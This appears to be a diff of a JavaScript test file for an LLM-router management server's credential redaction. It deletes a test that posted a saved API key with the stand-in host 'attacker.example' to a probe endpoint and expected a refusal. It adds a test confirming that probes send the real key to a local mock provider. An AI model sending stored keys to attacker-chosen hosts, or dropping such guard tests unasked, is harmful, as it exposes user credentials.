@@ -218,13 +218,6 @@ test("#1835 getConfig and saveConfig redact provider credentials without overwri
     assert.doesNotMatch(JSON.stringify(current), secrets);
     assert.equal(current.Providers[0].extraHeaders["x-visible"], "visible");
 
-    const foreignProbe = await fetch(new URL("/api/llmr/rpc", runtime.url), {
-      body: JSON.stringify({ args: [{ apiKey: current.Providers[0].api_key, baseUrl: "http://attacker.example/v1" }], method: "probeProvider" }),
-      headers: { "content-type": "application/json", "x-llmr-web-auth": token },
-      method: "POST"
-    });
-    assert.equal(foreignProbe.status, 500);
-    assert.match((await foreignProbe.json()).error.message, /only be sent to its own provider/);
     const misplaced = await fetch(new URL("/api/llmr/rpc", runtime.url), {
       body: JSON.stringify({ args: [{ apiKey: current.Providers[0].api_key, baseUrl: "http://127.0.0.1:9/v1" }], method: "getProviderCatalogModels" }),
       headers: { "content-type": "application/json", "x-llmr-web-auth": token },
@@ -264,6 +257,39 @@ test("#1835 getConfig and saveConfig redact provider credentials without overwri
     assert.equal((await stored("first")).api_key ?? "", "");
   } finally {
     await runtime.close();
+  }
+});
+
+test("#1835 a probe from the web UI reaches the provider with the saved key", async (t) => {
+  const { loadAppConfig, saveAppConfig } = await import("@llmr/core/config/config.ts");
+  const { gatewayService } = await import("@llmr/core/gateway/service.ts");
+  const { startWebManagementServer } = await import("@llmr/core/web/management-server.ts");
+  const seen = [];
+  const provider = createServer((request, response) => {
+    seen.push(`${request.headers.authorization ?? ""} ${request.headers["x-api-key"] ?? ""}`);
+    response.writeHead(200, { "content-type": "application/json" });
+    response.end(JSON.stringify({ data: [{ id: "alpha", object: "model" }], object: "list" }));
+  });
+  await listen(provider, 0);
+  const baseUrl = `http://127.0.0.1:${provider.address().port}/v1`;
+  const config = await loadAppConfig();
+  config.Providers = [{ api_base_url: baseUrl, api_key: "probe-secret", id: "probe", models: ["alpha"], name: "Probe", type: "openai_chat_completions" }];
+  await saveAppConfig(config);
+  const status = gatewayService.getStatus();
+  t.mock.method(gatewayService, "start", async () => status);
+  t.mock.method(gatewayService, "updateConfig", async () => status);
+  const token = "probe-test";
+  const runtime = await startWebManagementServer({ authToken: token, host: "127.0.0.1", port: 0, startGateway: false });
+  try {
+    const reference = (await rpc(runtime.url, token, "getConfig")).value.Providers[0].api_key;
+    assert.doesNotMatch(reference, /probe-secret/);
+    await rpc(runtime.url, token, "probeProvider", [{ apiKey: reference, baseUrl, mode: "models" }]);
+    assert.ok(seen.length > 0, "the probe reached the provider");
+    assert.ok(seen.some((headers) => headers.includes("probe-secret")), seen.join(" | "));
+    assert.ok(!seen.some((headers) => headers.includes("REDACTED")), "the reference text is never sent upstream");
+  } finally {
+    await runtime.close();
+    await new Promise((resolve) => provider.close(resolve));
   }
 });
 
